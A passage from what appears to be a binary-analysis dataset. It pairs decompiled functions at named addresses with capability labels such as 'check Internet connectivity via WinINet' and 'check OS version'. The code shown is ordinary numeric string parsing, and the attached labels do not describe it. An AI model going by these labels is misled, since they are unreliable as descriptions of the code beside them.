== &stack0xffffffc2) break;\n                uVar14 = *puVar13;\n                puVar9 = puVar13;\n            }\n            do {\n                if (*puVar9 < 0) {\n                    uVar14 = uVar14 | 1;\n                }\n                uVar4 = *puVar9 * 2;\n                if ((uVar14 & 2) != 0) {\n                    uVar4 = uVar4 | 1;\n                }\n                puVar13 = puVar9 + -2;\n                *puVar9 = uVar4;\n                puVar9 = puVar13;\n                uVar14 = uVar14 * 2;\n            } while (puVar13 != &stack0xffffffc2);\n            *(&stack0xffffff48 + iVar6) = &fcn.0043cc40::var_4eh;\n            *(&stack0xffffff44 + iVar6) = iVar8;\n            *(&stack0xffffff40 + iVar6) = 0x43cfcd;\n            fcn.004404f0();\n            stack0xffffffc0 = 0;\n            var_38h = 0;\n            var_34h = 0;\n    // WARNING: Ignoring partial resolution of indirect\n            var_30h = 0;\n            var_2ch._0_2_ = 0;\n            *(&stack0xffffff44 + iVar6) = iVar8;\n            var_30h = CONCAT22(var_64h._0_2_, var_30h);\n            *(&stack0xffffff48 + iVar6) = &fcn.0043cc40::var_4eh;\n            *(&stack0xffffff40 + iVar6) = 0x43d005;\n            fcn.004404f0();\n        }\n        else {\n            var_88h = var_88h | var_64h;\n            var_7ch = var_7ch - (var_6ch == 0);\n        }\n        var_80h = var_80h + 1;\n        var_78h = var_78h | var_64h;\ncode_r0x0043cea4:\n        var_5ch = var_5ch + 1;\n        uVar3 = *var_5ch;\n        goto code_r0x0043ceae;\n    }\n    if (var_70h == uVar3) {\n        if (var_6ch != 0) goto code_r0x0043d1e4;\n        var_6ch = 1;\n        goto code_r0x0043cea4;\n    }\n    var_6ch = var_94h | var_80h;\n    if ((uVar3 & 0xdf) != 0x45) goto code_r0x0043d027;\n    if ((var_94h | var_80h) == 0) {\n        var_84h = 0;\n        goto code_r0x0043d027;\n    }\n    uVar3 = var_5ch[1];\n    if (uVar3 == 0x2d) {\n        iVar8 = -1;\n        puVar7 = var_5ch + 2;\n        uVar3 = var_5ch[2];\n    }\n    else {\n        puVar7 = var_5ch + 1;\n        iVar8 = 1;\n    }\n    if (uVar3 == 0x2b) {\n        uVar3 = puVar7[1];\n        puVar7 = puVar7 + 1;\n    }\n    if (9 < uVar3 - 0x30) goto code_r0x0043d027;\n    do {\n        if (var_84h < 0x1372) {\n            var_84h = uVar3 + -0x30 + var_84h * 10;\n        }\n        puVar7 = puVar7 + 1;\n        uVar3 = *puVar7;\n    } while (uVar3 - 0x30 < 10);\n    if (iVar8 == -1) {\n        if (0x1371 < var_84h) {\n            var_4eh._2_2_ = 0;\n            var_4ah._0_2_ = 0;\n            var_4ah._2_2_ = 0;\n            var_46h._0_2_ = 0;\n            var_46h._2_2_ = 0;\n            var_42h._0_2_ = 0;\n            var_42h._2_2_ = 0;\n            var_3eh._0_2_ = 0;\n            var_4eh._0_2_ = var_72h;\n            *(&stack0xffffff48 + iVar6) = arg_ch;\n            *(&stack0xffffff44 + iVar6) = &fcn.0043cc40::var_4eh;\n            *(&stack0xffffff40 + iVar6) = 0x43d5b7;\n            fcn.004408e0();\n            var_5ch = puVar7;\n            if (var_78h == 0) goto code_r0x0043cd80;\n            goto code_r0x0043d1a2;\n        }\n        var_5ch = puVar7;\n        var_84h = -var_84h;\ncode_r0x0043d027:\n        var_70h = var_84h - var_7ch;\n        if (var_84h - var_7ch < 1) {\n            *(&stack0xffffff44 + iVar6) = &fcn.0043cc40::var_4eh;\n            *(&stack0xffffff40 + iVar6) = 0x43d49f;\n            iVar8 = fcn.00440b50();\n            if (iVar8 < 0x51) {\n                *(&stack0xffffff58 + iVar6) = 0x50;\n                *(&stack0xffffff54 + iVar6) = 0x40;\n                *(&stack0xffffff4c + iVar6) = 0;\n                *(&stack0xffffff50 + iVar6) = 0x404e - iVar8;\n                *(&stack0xffffff48 + iVar6) = var_88h;\n                *(&stack0xffffff44 + iVar6) = &fcn.0043cc40::var_4eh;\n                *(&stack0xffffff40 + iVar6) = 0x43d4e2;\n                fcn.00440d00();\n                var_7ch = var_4eh._2_2_;\n                if (var_70h != 0) {\n                    if (var_70h < -0x1000) {\n                        uVar15 = &fcn.0043cc40::var_2ch + 2;\n                        *(&stack0xffffff44 + iVar6) = 0x527280;\n                        *(&stack0xffffff48 + iVar6) = uVar15;\n                        var_80h = uVar15;\n                        *(&stack0xffffff40 + iVar6) = 0x43d53f;\n                        fcn.00440430();\n                        uVar2 = var_7ch;\n                        uVar10 = var_28h;\n                        *(&stack0xffffff44 + iVar6) = uVar15;\n                        *(&stack0xffffff48 + iVar6) = &fcn.0043cc40::var_4eh;\n                        *(&stack0xffffff40 + iVar6) = 0x43d557;\n                        fcn.00440570();\n                        var_84h = -1;\n                        var_7ch = (uVar2 - uVar10) + 0x3fff;\n                        var_70h = -var_70h - 0x1000;\n                    }\n                    else {\n                        var_70h = -var_70h;\n                        var_84h = -1;\n                        var_80h = &fcn.0043cc40::var_2ch + 2;\n                    }\n                    goto code_r0x0043d2ec;\n                }\n                goto code_r0x0043d267;\n            }\ncode_r0x0043d165:\n            var_4eh._2_2_ = 0;\n            var_4ah._0_2_ = 0;\n            var_4ah._2_2_ = 0;\n            var_46h._0_2_ = 0;\n            var_46h._2_2_ = 0;\n            var_42h._0_2_ = 0;\n            var_42h._2_2_ = 0;\n            var_3eh._0_2_ = 0;\n        }\n        else {\n            if (var_4ah == 0) {\n                var_64h = &fcn.0043cc40::var_2ch;\n                do {\n                    uVar15 = 0;\n                    stack0xffffffc0 = CONCAT22(var_4eh._2_2_, var_4eh);\n                    var_38h = CONCAT22(var_4ah._2_2_, var_4ah);\n                    var_34h = CONCAT22(var_46h._2_2_, var_46h);\n                    var_30h = CONCAT22(var_42h._2_2_, var_42h);\n                    var_2ch._0_2_ = 0;\n                    uVar14 = 0;\n                    puVar9 = var_64h;\n                    while( true ) {\n                        if (uVar14 < 0) {\n                            uVar15 = uVar15 | 1;\n                        }\n                        uVar4 = uVar14 * 2;\n                        if ((uVar15 & 2) != 0) {\n                            uVar4 = uVar14 * 2 | 1;\n                        }\n                        puVar13 = puVar9 - 2;\n                        uVar15 = uVar15 * 2;\n                        *puVar9 = uVar4;\n                        if (puVar13 == &stack0xffffffc2) break;\n                        uVar14 = *puVar13;\n                        puVar9 = puVar13;\n                    }\n                    uVar15 = 0;\n                    puVar9 = var_64h;\n                    do {\n                        if (*puVar9 < 0) {\n                            uVar15 = uVar15 | 1;\n                        }\n                        uVar14 = *puVar9 * 2;\n                        if ((uVar15 & 2) != 0) {\n                            uVar14 = uVar14 | 1;\n                        }\n                        puVar13 = puVar9 - 2;\n                        uVar15 = uVar15 * 2;\n                        *puVar9 = uVar14;\n                        puVar9 = puVar13;\n                    } while (puVar13 != &stack0xffffffc2);\n                    *(&stack0xffffff48 + iVar6) = &fcn.0043cc40::var_3eh + 2;\n                    *(&stack0xffffff44 + iVar6) = &fcn.0043cc40::var_4eh;\n                    *(&stack0xffffff40 + iVar6) = 0x43d0e7;\n                    fcn.004404f0();\n                    uVar15 = 0;\n                    puVar9 = var_64h;\n                    do {\n                        if (*puVar9 < 0) {\n                            uVar15 = uVar15 | 1;\n                        }\n                        uVar14 = *puVar9 * 2;\n                        if ((uVar15 & 2) != 0) {\n                            uVar14 = uVar14 | 1;\n                        }\n                        puVar13 = puVar9 - 2;\n                        uVar15 = uVar15 * 2;\n                        *puVar9 = uVar14;\n                        puVar9 = puVar13;\n                    } while (puVar13 != &stack0xffffffc2);\n                    if (var_38h != 0) goto code_r0x0043d151;\n                    var_70h = var_70h - 1;\n                    var_3eh._0_2_ = 0;\n                    var_4eh._0_2_ = stack0xffffffc0;\n                    var_4eh._2_2_ = stack0xffffffc0 >> 0x10;\n                    var_4ah._2_2_ = var_38h >> 0x10;\n                    var_46h._0_2_ = var_34h;\n                    var_46h._2_2_ = var_34h >> 0x10;\n                    var_42h._0_2_ = var_30h;\n                    var_42h._2_2_ = var_30h >> 0x10;\n                    var_4ah._0_2_ = var_38h;\n                } while (var_70h != 0);\n                *(&stack0xffffff44 + iVar6) = &fcn.0043cc40::var_4eh;\n                *(&stack0xffffff40 + iVar6) = 0x43d21f;\n                iVar8 = fcn.00440b50();\n                if (iVar8 < 0x51) {\n                    *(&stack0xffffff58 + iVar6) = 0x50;\n                    *(&stack0xffffff54 + iVar6) = 0x40;\n                    uVar15 = var_88h;\n                    *(&stack0xffffff4c + iVar6) = 0;\n                    *(&stack0xffffff50 + iVar6) = 0x404e - iVar8;\n                    *(&stack0xffffff48 + iVar6) = uVar15;\n                    *(&stack0xffffff44 + iVar6) = &fcn.0043cc40::var_4eh;\n                    *(&stack0xffffff40 + iVar6) = 0x43d260;\n                    fcn.00440d00();\n                    var_7ch = var_4eh._2_2_;\n                    goto code_r0x0043d267;\n                }\n                goto code_r0x0043d165;\n            }\ncode_r0x0043d151:\n            *(&stack0xffffff44 + iVar6) = &fcn.0043cc40::var_4eh;\n            *(&stack0xffffff40 + iVar6) = 0x43d15c;\n            iVar8 = fcn.00440b50();\n            if (0x50 < iVar8) goto code_r0x0043d165;\n            *(&stack0xffffff58 + iVar6) = 0x50;\n            *(&stack0xffffff54 + iVar6) = 0x40;\n            uVar15 = var_88h;\n            *(&stack0xffffff4c + iVar6) = 0;\n            *(&stack0xffffff50 + iVar6) = 0x404e - iVar8;\n            *(&stack0xffffff48 + iVar6) = uVar15;\n            *(&stack0xffffff44 + iVar6) = &fcn.0043cc40::var_4eh;\n            *(&stack0xffffff40 + iVar6) = 0x43d2d5;\n            fcn.00440d00();\n            var_84h = 1;\n            var_7ch = var_4eh._2_2_;\n            var_80h = &fcn.0043cc40::var_2ch + 2;\ncode_r0x0043d2ec:\n            uVar2 = var_70h;\n            puVar9 = &fcn.0043cc40::var_3eh + 2;\n            iVar8 = 0x527310;\n            uVar15 = 1;\n            stack0xffffffc0 = *0x52731c;\n            var_38h = *0x527320;\n            var_34h = *0x527324;\n            do {\n                if ((uVar2 & uVar15) != 0) {\n                    *(&stack0xffffff4c + iVar6) = puVar9;\n                    *(&stack0xffffff48 + iVar6) = puVar9;\n                    *(&stack0xffffff44 + iVar6) = iVar8;\n                    var_64h = puVar9;\n                    *(&stack0xffffff40 + iVar6) = 0x43d344;\n                    fcn.00441090();\n                    puVar9 = var_64h;\n                }\n                uVar10 = var_80h;\n                iVar8 = iVar8 + -0xc;\n                uVar15 = uVar15 * 2;\n            } while (iVar8 != 0x527274);\n            *(&stack0xffffff44 + iVar6) = puVar9;\n            *(&stack0xffffff48 + iVar6) = uVar10;\n            *(&stack0xffffff40 + iVar6) = 0x43d35a;\n            fcn.00440430();\n            if (var_84h == -1) {\n                iVar8 = var_7ch - var_28h;\n                *(&stack0xffffff48 + iVar6) = &fcn.0043cc40::var_4eh;\n                *(&stack0xffffff44 + iVar6) = var_80h;\n                *(&stack0xffffff40 + iVar6) = 0x43d483;\n                var_70h = fcn.00440570();\n                var_7ch = iVar8 + 0x3fff;\n            }\n            else {\n                iVar8 = var_28h + var_7ch;\n                *(&stack0xffffff48 + iVar6) = &fcn.0043cc40::var_4eh;\n                *(&stack0xffffff44 + iVar6) = var_80h;\n                *(&stack0xffffff40 + iVar6) = 0x43d380;\n                var_70h = fcn.004407d0();\n                var_7ch = iVar8 - 0x3ffe;\n            }\ncode_r0x0043d267:\n            uVar15 = var_7ch;\n            *(&stack0xffffff58 + iVar6) = 0x40;\n            *(&stack0xffffff54 + iVar6) = 0x40;\n            *(&stack0xffffff4c + iVar6) = 0;\n            *(&stack0xffffff50 + iVar6) = uVar15;\n            *(&stack0xffffff48 + iVar6) = var_70h;\n            *(&stack0xffffff44 + iVar6) = &fcn.0043cc40::var_4eh;\n            *(&stack0xffffff40 + iVar6) = 0x43d298;\n            fcn.00440d00();\n        }\n        var_4eh._0_2_ = var_72h;\n        *(&stack0xffffff48 + iVar6) = arg_ch;\n        *(&stack0xffffff44 + iVar6) = &fcn.0043cc40::var_4eh;\n        *(&stack0xffffff40 + iVar6) = 0x43d19b;\n        fcn.004408e0();\n        if (var_78h != 0) goto code_r0x0043d1a2;\n    }\n    else {\n        if (var_84h < 0x1372) {\n            var_5ch = puVar7;\n            goto code_r0x0043d027;\n        }\n        var_4eh._2_2_ = 0;\n        var_4ah._0_2_ = 0;\n        var_4ah._2_2_ = 0;\n        var_3eh._0_2_ = 0;\n        var_46h._0_2_ = 0;\n        var_46h._2_2_ = 0;\n        var_42h._0_2_ = 0;\n        var_42h._2_2_ = 0;\n        if (var_78h == 0) goto code_r0x0043cdd2;\n        var_4eh._2_2_ = 0x7fff;\n        var_4eh._0_2_ = var_72h;\n        *(&stack0xffffff48 + iVar6) = arg_ch;\n        *(&stack0xffffff44 + iVar6) = &fcn.0043cc40::var_4eh;\n        *(&stack0xffffff40 + iVar6) = 0x43d460;\n        fcn.004408e0();\n        var_5ch = puVar7;\ncode_r0x0043d1a2:\n        fVar1 = *arg_ch;\n        if ((fVar1 == 0) || (((fVar1 != 0) << 10 | (fVar1 == 0) << 0xe) == 0x500)) {\n            *(&stack0xffffff40 + iVar6) = 0x43d1dc;\n            puVar9 = sub.msvcrt.dll__errno();\n            *puVar9 = 0x22;\n        }\n    }\n    if (var_6ch == 0) {\n        return NULL;\n    }\ncode_r0x0043cd80:\n    return var_5ch + (var_60h - var_68h);\ncode_r0x0043d1e4:\n    var_6ch = var_94h | var_80h;\n    goto code_r0x0043d027;\n}\n",
        "token_count": 7333
    },
    "0043e050": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall\nfcn.0043e050(uint32_t *param_1, uint32_t *param_2, uint param_3, uint32_t param_4, int32_t param_5, uint32_t *param_6)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    ulong *in_EAX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    ulong uVar9;\n    uint32_t uStack56;\n    uint32_t uStack52;\n    uint32_t uStack36;\n    uint32_t auStack32 [4];\n    \n    uVar9 = *in_EAX;\n    iVar4 = fcn.004468d0(uVar9, auStack32, &uStack36);\n    uVar7 = uVar9 >> 0x20;\n    uVar2 = *param_2;\n    uStack36 = uStack36 - uVar2;\n    auStack32[0] = auStack32[0] + uStack36;\n    if (uStack36 < 1) {\n        if (param_4 == 0) {\n            uVar5 = 0;\n            goto code_r0x0043e154;\n        }\n        uStack52 = 0;\n        uStack56 = 0;\n        if (uStack36 != 0) {\n            uVar7 = -uStack36;\n            iVar4 = fcn.00446480(iVar4, uVar7);\n        }\n    }\n    else if (uVar2 == 0x35) {\n        uVar5 = 0;\n        if ((param_4 == 0) || (param_2[3] != 1)) goto code_r0x0043e154;\ncode_r0x0043e2df:\n        uStack52 = fcn.00446c50(iVar4, uStack36);\n        uVar9 = CONCAT44(uStack36, iVar4);\n        if (uStack52 == 0) {\n            fcn.004458b0(iVar4);\n            uVar7 = uVar9 >> 0x20;\n            uStack56 = 0;\n        }\n        else {\ncode_r0x0043e3b0:\n            fcn.004458b0(uVar9);\n            uVar7 = uVar9 >> 0x20;\n            uStack56 = 0x10;\n        }\n    }\n    else if (param_5 == 1) {\n        uStack52 = fcn.00446c50(iVar4, uStack36);\n        uVar9 = CONCAT44(uStack36, iVar4);\n        if (uStack52 != 0) goto code_r0x0043e3b0;\ncode_r0x0043e40d:\n        fcn.004458b0(uVar9);\n        uVar7 = uVar9 >> 0x20;\n        uStack56 = 0;\n    }\n    else {\n        if (param_5 != 2) {\n            uVar5 = uStack36 - 1;\n            if (uVar5 == 0) {\n                uVar5 = 0;\n                if (param_4 == 0) goto code_r0x0043e154;\n                if ((*(iVar4 + 0x14) & 2) == 0) goto code_r0x0043e2df;\n            }\n            else if ((*(iVar4 + 0x14 + (uVar5 >> 5) * 4) >> (uVar5 & 0x1f) & 1) == 0) {\n                uStack52 = fcn.00446c50(iVar4, uStack36);\n                if (uStack52 != 0) {\n                    uVar7 = uStack36;\n                    fcn.004458b0(iVar4, uStack36);\n                    uStack56 = 0x10;\n                    goto code_r0x0043e194;\n                }\n                uVar9 = CONCAT44(uStack36, iVar4);\n                goto code_r0x0043e40d;\n            }\n        }\n        uStack52 = fcn.00446c50(iVar4, uStack36);\n        uVar7 = uStack36;\n        fcn.004458b0(iVar4, uStack36);\n        iVar4 = fcn.0043dfb0(iVar4, uVar7);\n        uVar5 = uVar2 & 0x1f;\n        if (uVar5 != 0) {\n            uVar5 = 0x20 - uVar5;\n        }\n        puVar1 = iVar4 + 0x10 + *(iVar4 + 0x10) * 4;\n        uVar3 = 0x1f;\n        if (*puVar1 != 0) {\n            for (; *puVar1 >> uVar3 == 0; uVar3 = uVar3 - 1) {\n            }\n        }\n        if (uVar5 == (uVar3 ^ 0x1f)) {\n            uStack56 = 0x20;\n        }\n        else {\n            if (uStack52 == 0) {\n                uStack52 = *(iVar4 + 0x14) & 1;\n            }\n            uVar7 = 1;\n            fcn.004458b0(iVar4, 1);\n            uStack56 = 0x20;\n            auStack32[0] = auStack32[0] + 1;\n        }\n    }\ncode_r0x0043e194:\n    uVar5 = param_2[1];\n    if (auStack32[0] < uVar5) {\n        iVar8 = uVar5 - auStack32[0];\n        auStack32[0] = uVar5;\n        if ((uVar2 < iVar8) || (uVar5 = param_2[4],  uVar5 != 0)) {\n            *(iVar4 + 0x10) = 0;\n            uStack56 = 0;\n            *param_6 = 0x50;\n            uVar7 = uStack56;\n        }\n        else {\n            uVar3 = iVar8 - 1;\n            if ((0 < uVar3) && (uStack52 == 0)) {\n                uVar7 = uVar3;\n                uStack52 = fcn.00446c50(iVar4, uVar3);\n            }\n            if ((uStack52 | param_4) == 0) goto code_r0x0043e154;\n            uVar7 = *(iVar4 + 0x14 + (uVar3 >> 5) * 4);\n            fcn.004458b0(iVar4, iVar8);\n            *param_6 = 2;\n            if ((1 << (uVar3 & 0x1f) & uVar7) == 0) {\n                uVar7 = 0x50;\n                if (uStack52 == 0) {\n                    uVar7 = uStack56;\n                }\n            }\n            else {\n                iVar4 = fcn.0043dfb0(iVar4, iVar8);\n                uStack56 = 0x60;\n                uVar7 = uStack56;\n            }\n        }\n    }\n    else {\n        uVar7 = uStack56;\n        if (param_2[2] < auStack32[0]) {\n            auStack32[0] = param_2[2] + 1;\n            *param_6 = 0xa3;\n            puVar6 = sub.msvcrt.dll__errno();\n            uStack56 = 0;\n            *puVar6 = 0x22;\n            *(iVar4 + 0x10) = 0;\n            uVar7 = uStack56;\n        }\n    }\n    uStack56 = uVar7;\n    uVar5 = 1;\n    *param_1 = auStack32[0];\n    uVar7 = uVar2;\n    fcn.00446bf0(param_3, uVar2, iVar4);\n    *param_6 = *param_6 | uStack56;\ncode_r0x0043e154:\n    fcn.00446000(iVar4, uVar7);\n    return uVar5;\n}\n",
        "token_count": 1833
    },
    "0043e4f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0043e4f0(uint8_t *param_1, uint8_t **param_2, uint32_t *param_3, uint32_t *param_4, uint *param_5)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    double dVar3;\n    bool bVar4;\n    uint8_t **ppuVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint8_t *puVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint *puVar17;\n    uint32_t uVar19;\n    uint8_t uVar20;\n    int32_t iVar21;\n    uint32_t uVar22;\n    uint32_t *puVar23;\n    int32_t *piVar24;\n    int32_t *piVar25;\n    uint32_t uVar26;\n    int32_t iVar27;\n    uint8_t *puVar28;\n    uint32_t uVar29;\n    int32_t iVar30;\n    uint32_t uVar31;\n    float10 fVar32;\n    bool bVar33;\n    uint32_t uVar34;\n    int32_t iVar35;\n    uint32_t uStack204;\n    uint8_t *puStack188;\n    uint32_t uStack184;\n    uint32_t uStack180;\n    double dStack172;\n    uint32_t uStack164;\n    uint32_t uStack160;\n    int32_t iStack156;\n    double dStack148;\n    int32_t iStack140;\n    uint32_t uStack128;\n    uint32_t uStack116;\n    uint32_t uStack104;\n    uint32_t uStack100;\n    int32_t iStack64;\n    uchar auStack60 [4];\n    uint32_t uStack56;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    uint8_t *puStack44;\n    int32_t iStack40;\n    ulong uStack36;\n    uint *puVar18;\n    \n    ppuVar5 = sub.msvcrt.dll_localeconv();\n    puVar28 = *ppuVar5;\n    uVar6 = sub.msvcrt.dll_strlen(puVar28);\n    uStack56 = 0;\n    iStack40 = 0;\n    uStack36 = 0.0;\n    uVar34 = *param_3;\n    puStack44 = param_1;\n    uVar20 = *param_1;\n    if (uVar20 < 0x2e) {\ncode_r0x0043e553:\n    // switch table (46 cases) at 0x52758c\n        switch(*(uVar20 * 4 + 0x52758c)) {\n        case 0x43e560:\n            goto code_r0x0043e560;\n        case 0x43e5a0:\n            iStack140 = 0;\n            break;\n        case 0x43e650:\n            goto code_r0x0043e650;\n        case 0x43e670:\n            goto code_r0x0043e670;\n        case 0x43e6e0:\n            iStack140 = 1;\n        }\n        uVar20 = puStack44[1];\n        puStack44 = puStack44 + 1;\n        if (uVar20 == 0) {\ncode_r0x0043e560:\n            if (param_2 == NULL) {\n                return 6;\n            }\n            *param_2 = param_1;\n            return 6;\n        }\n        goto joined_r0x0043e5c9;\n    }\ncode_r0x0043e670:\n    iStack140 = 0;\njoined_r0x0043e5c9:\n    uStack180 = 0;\n    if (uVar20 != 0x30) {\ncode_r0x0043e5cf:\n        puStack188 = puStack44;\n        uVar19 = uVar20;\n        uVar16 = param_3[4];\n        if (uVar19 - 0x30 < 10) {\n            uStack204 = 0;\n            uStack164 = 0;\n            uVar26 = 0;\n            do {\n                puStack44 = puStack44 + 1;\n                if (uVar26 < 9) {\n                    uStack164 = (uVar19 - 0x30) + uStack164 * 10;\n                }\n                else if (uVar26 < 0x10) {\n                    uStack204 = (uVar19 - 0x30) + uStack204 * 10;\n                }\n                uVar20 = *puStack44;\n                uVar19 = uVar20;\n                uVar26 = uVar26 + 1;\n            } while (uVar19 - 0x30 < 10);\n        }\n        else {\n            uStack204 = 0;\n            uStack164 = 0;\n            uVar26 = 0;\n        }\n        uVar29 = uVar26;\n        if (*puVar28 == uVar20) {\n            if (puVar28[1] != 0) {\n                if (puVar28[1] == puStack44[1]) {\n                    puVar28 = puVar28 + 2;\n                    puVar8 = puStack44 + 2;\n                    do {\n                        uVar20 = *puVar28;\n                        if (uVar20 == 0) goto code_r0x0043eba9;\n                        puVar28 = puVar28 + 1;\n                        uVar2 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                    } while (uVar2 == uVar20);\n                }\n                goto code_r0x0043e700;\n            }\n            puVar8 = puStack44 + 1;\ncode_r0x0043eba9:\n            uVar19 = *puVar8;\n            puStack44 = puVar8;\n            if (uVar26 == 0) {\n                if (uVar19 == 0x30) {\n                    do {\n                        puStack44 = puStack44 + 1;\n                        uVar19 = *puStack44;\n                        uVar31 = puStack44 - puVar8;\n                    } while (uVar19 == 0x30);\n                }\n                else {\n                    uVar31 = 0;\n                }\n                if (uVar19 - 0x31 < 9) {\n                    uStack160 = uVar19 - 0x30;\n                    dStack172._0_4_ = uVar31 + 1;\n                    uVar29 = 1;\n                    puStack188 = puStack44;\n                    goto code_r0x0043fea0;\n                }\n                dStack172._0_4_ = 0;\n                uVar29 = 0;\n            }\n            else {\n                dStack172._0_4_ = 0;\n                uVar31 = 0;\n                while (uStack160 = uVar19 - 0x30,  uStack160 < 10) {\n                    uVar15 = uVar31 + 1;\n                    if (uStack160 != 0) {\n                        dStack172._0_4_ = dStack172._0_4_ + uVar15;\n                        uVar19 = uVar29;\n                        if (uVar15 != 1) {\n                            uVar19 = uVar31 + uVar29;\n                            do {\n                                if (uVar29 < 9) {\n                                    uStack164 = uStack164 * 10;\n                                }\n                                else if (uVar29 + 1 < 0x11) {\n                                    uStack204 = uStack204 * 10;\n                                }\n                                uVar29 = uVar29 + 1;\n                            } while (uVar19 != uVar29);\n                        }\n                        uVar29 = uVar19 + 1;\n                        if (uVar19 < 9) {\ncode_r0x0043fea0:\n                            uStack164 = uStack160 + uStack164 * 10;\n                            uVar15 = 0;\n                        }\n                        else {\n                            uVar15 = 0;\n                            if (uVar29 < 0x11) {\n                                uStack204 = uStack160 + uStack204 * 10;\n                            }\n                        }\n                    }\n                    uVar19 = puStack44[1];\n                    uVar31 = uVar15;\n                    puStack44 = puStack44 + 1;\n                }\n            }\n            bVar33 = true;\n        }\n        else {\ncode_r0x0043e700:\n            uVar31 = 0;\n            dStack172._0_4_ = 0;\n            bVar33 = false;\n        }\n        puVar28 = puStack44;\n        if ((uVar19 & 0xffffffdf) == 0x45) {\n            if ((uVar29 | uVar31 | uStack180) != 0) {\n                param_1 = puStack44;\n                uVar20 = puStack44[1];\n                if (uVar20 == 0x2b) {\n                    bVar4 = false;\ncode_r0x0043ef58:\n                    uVar20 = puStack44[2];\n                    puStack44 = puStack44 + 2;\n                }\n                else {\n                    if (uVar20 == 0x2d) {\n                        bVar4 = true;\n                        goto code_r0x0043ef58;\n                    }\n                    bVar4 = false;\n                    puStack44 = puStack44 + 1;\n                }\n                uVar19 = uVar20;\n                puVar8 = puStack44;\n                if (uVar19 - 0x30 < 10) {\n                    while (uVar19 == 0x30) {\n                        uVar19 = puVar8[1];\n                        puVar8 = puVar8 + 1;\n                    }\n                    iVar7 = 0;\n                    puStack44 = puVar8;\n                    if (uVar19 - 0x31 < 9) {\n                        iVar7 = uVar19 - 0x30;\n                        puStack44 = puVar8 + 1;\n                        uVar19 = puVar8[1];\n                        if (uVar19 - 0x30 < 10) {\n                            puVar28 = puVar8 + 2;\n                            do {\n                                puStack44 = puVar28;\n                                iVar7 = (uVar19 - 0x30) + iVar7 * 10;\n                                uVar19 = *puStack44;\n                                puVar28 = puStack44 + 1;\n                            } while (uVar19 - 0x30 < 10);\n                        }\n                        if ((8 < puStack44 - puVar8) || (19999 < iVar7)) {\n                            iVar7 = 19999;\n                        }\n                        if (bVar4) {\n                            iVar7 = -iVar7;\n                        }\n                    }\n                }\n                else {\n                    iVar7 = 0;\n                    puStack44 = puVar28;\n                }\n                goto code_r0x0043e71e;\n            }\n            goto code_r0x0043e931;\n        }\n        iVar7 = 0;\n        puStack44 = puVar28;\ncode_r0x0043e71e:\n        if (uVar29 == 0) {\n            if ((uStack180 | uVar31) != 0) goto code_r0x0043e951;\n            if (!bVar33) {\n                if (uVar19 == 0x4e) {\ncode_r0x0043e757:\n                    iVar7 = fcn.00446ba0(&puStack44, 0x527589);\n                    if (iVar7 != 0) {\n                        uStack56 = 4;\n                        *param_4 = param_3[2] + 1;\n                        if (*puStack44 != 0x28) goto code_r0x0043e951;\n                        uStack56 = fcn.00445a80(&puStack44, param_3, param_5);\ncode_r0x0043e7d7:\n                        *param_4 = param_3[2] + 1;\n                        goto code_r0x0043e951;\n                    }\n                }\n                else if (uVar19 < 0x4f) {\n                    if (uVar19 == 0x49) goto code_r0x0043fbd0;\n                }\n                else if (uVar19 == 0x69) {\ncode_r0x0043fbd0:\n                    iVar7 = fcn.00446ba0(&puStack44, 0x527580);\n                    if (iVar7 != 0) {\n                        puStack44 = puStack44 + -1;\n                        iVar7 = fcn.00446ba0(&puStack44, \"inity\");\n                        if (iVar7 == 0) {\n                            puStack44 = puStack44 + 1;\n                        }\n                        uStack56 = 3;\n                        goto code_r0x0043e7d7;\n                    }\n                }\n                else if (uVar19 == 0x6e) goto code_r0x0043e757;\n            }\ncode_r0x0043e931:\n            uStack56 = 6;\n            puStack44 = param_1;\n            goto code_r0x0043e951;\n        }\n        iVar7 = iVar7 - dStack172._0_4_;\n        uStack56 = 1;\n        uVar19 = param_3[3] & 3;\n        uStack128 = uVar19 - iStack140;\n        if ((uVar19 != 2) && (uStack128 = iStack140 + 1,  uVar19 != 3)) {\n            uStack128 = uVar19 == 0;\n        }\n        if (uVar26 == 0) {\n            uVar26 = uVar29;\n        }\n        uVar19 = 0x10;\n        if (uVar29 < 0x11) {\n            uVar19 = uVar29;\n        }\n        uStack36 = uStack164;\n        if (9 < uVar29) {\n            uStack36 = uStack204 + uStack36 * *(uVar19 * 8 + 0x5278d8);\n        }\n        iVar21 = iVar7;\n        if ((0x35 < uVar34) || (0xf < uVar29)) goto code_r0x0043ec14;\n        if (iVar7 == 0) {\n            bVar33 = true;\ncode_r0x0043eb36:\n            iVar21 = fcn.0043e050(param_5, bVar33, uStack128, &uStack56);\n            if (iVar21 != 0) goto code_r0x0043e951;\n            iVar21 = 0;\n        }\n        else if (iVar7 < 1) {\n            if (-0x17 < iVar7) {\n                uStack36 = uStack36 / *(iVar7 * -8 + 0x527920);\ncode_r0x0043fb74:\n                bVar33 = false;\n                goto code_r0x0043eb36;\n            }\n        }\n        else {\n            if (iVar7 < 0x17) {\n                if (uStack36 == 0) {\n                    iVar21 = 0;\n                    for (uStack36._4_4_ = uStack36._4_4_ | 0x100000; (uStack36._4_4_ & 1) == 0;\n                        uStack36._4_4_ = uStack36._4_4_ >> 1 | 0x80000000) {\n                        iVar21 = iVar21 + 1;\n                    }\n                    iVar21 = 0x15 - iVar21;\n                }\n                else {\n                    iVar21 = 0;\n                    for (; 